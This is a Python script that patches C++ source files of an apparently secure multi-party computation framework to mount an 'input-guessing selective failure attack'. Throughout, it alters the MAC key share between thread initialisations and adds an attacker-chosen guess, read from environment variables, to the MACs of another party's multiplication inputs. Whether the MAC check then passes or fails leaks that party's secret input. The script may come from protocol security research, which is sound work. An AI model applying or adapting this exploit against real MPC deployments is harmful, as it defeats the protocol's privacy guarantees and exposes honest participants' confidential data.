#!/usr/bin/env python3
"""Patch for the input-guessing selective failure attack.

Two patches:
1. Machine.hpp: change alphapi between thread inits (same as before)
2. Instruction.hpp: when executing MULS on a worker thread, add ATTACK_GUESS
   to the MAC of each input share before the multiplication.

This is cleaner than patching memory loads — we modify the shares
right before they enter the Beaver multiplication.
"""

import sys

# Patch 1: Machine.hpp
with open("Processor/Machine.hpp", "r") as f:
    code = f.read()

old = """  for (int i = old_n_threads; i < nthreads; i++)
    {
      queues[i] = new ThreadQueue;
      // stand-in for initialization
      queues[i]->schedule({});
      tinfo[i].thread_num=i;
      tinfo[i].Nms=&N;
      tinfo[i].alphapi=&alphapi;
      tinfo[i].alpha2i=&alpha2i;
      tinfo[i].machine=this;
      pthread_t thread;
      int res = pthread_create(&thread, NULL,
          thread_info<sint, sgf2n>::Main_Func, &tinfo[i]);

      if (res == 0)
        threads.push_back(thread);
      else
        throw runtime_error("cannot start thread");
    }

  assert(queues.size() == threads.size());

  // synchronize with clients before starting timer
  for (int i=old_n_threads; i<nthreads; i++)
    {
      queues[i]->result();
    }"""

new = """  bool do_attack = (getenv("ATTACK_MAC_KEY") != nullptr)
                   and (nthreads > 1) and (old_n_threads == 0);
  for (int i = old_n_threads; i < nthreads; i++)
    {
      queues[i] = new ThreadQueue;
      queues[i]->schedule({});
      tinfo[i].thread_num=i;
      tinfo[i].Nms=&N;
      tinfo[i].alphapi=&alphapi;
      tinfo[i].alpha2i=&alpha2i;
      tinfo[i].machine=this;
      pthread_t thread;
      int res = pthread_create(&thread, NULL,
          thread_info<sint, sgf2n>::Main_Func, &tinfo[i]);
      if (res == 0)
        threads.push_back(thread);
      else
        throw runtime_error("cannot start thread");
      if (do_attack and i == old_n_threads)
        {
          queues[i]->result();
          alphapi += 1;
        }
    }
  assert(queues.size() == threads.size());
  for (int i=old_n_threads; i<nthreads; i++)
    {
      if (do_attack and i == old_n_threads) continue;
      queues[i]->result();
    }"""

assert old in code, "Machine.hpp patch target not found"
code = code.replace(old, new)
if "<cstdlib>" not in code:
    code = '#include <cstdlib>\n' + code
with open("Processor/Machine.hpp", "w") as f:
    f.write(code)
print("Patched Machine.hpp")


# Patch 2: Processor.hpp — modify muls() to add guess to MACs on worker threads
with open("Processor/Processor.hpp", "r") as f:
    code = f.read()

old = """template<class T>
void SubProcessor<T>::muls(const vector<int>& reg)
{
    assert(reg.size() % 4 == 0);

    SubProcessor<T>& proc = *this;
    protocol.init_mul();"""

new = """template<class T>
void SubProcessor<T>::muls(const vector<int>& reg)
{
    assert(reg.size() % 4 == 0);

    // ATTACK: on worker threads, add guess to MAC of multiplication inputs
    const char* gs = getenv("ATTACK_GUESS");
    if (gs and P.my_num() == 0
        and BaseMachine::has_singleton()
        and BaseMachine::s().thread_num > 0)
      {
        long g = atol(gs);
        if (g != 0)
          for (auto it = reg.begin(); it < reg.end(); it += 4)
            for (int j = 0; j < *it; j++)
              {
                // Only modify the SECOND operand (index 3 = y)
                // The first operand (index 2 = x) is the attacker's own input
                auto& share = S[*(it + 3) + j];
                auto mac = share.get_mac();
                mac += g;
                share = T(share.get_share(), mac);
              }
      }

    SubProcessor<T>& proc = *this;
    protocol.init_mul();"""

assert old in code, "Processor.hpp muls patch target not found"
code = code.replace(old, new)
with open("Processor/Processor.hpp", "w") as f:
    f.write(code)
print("Patched Processor.hpp (muls)")
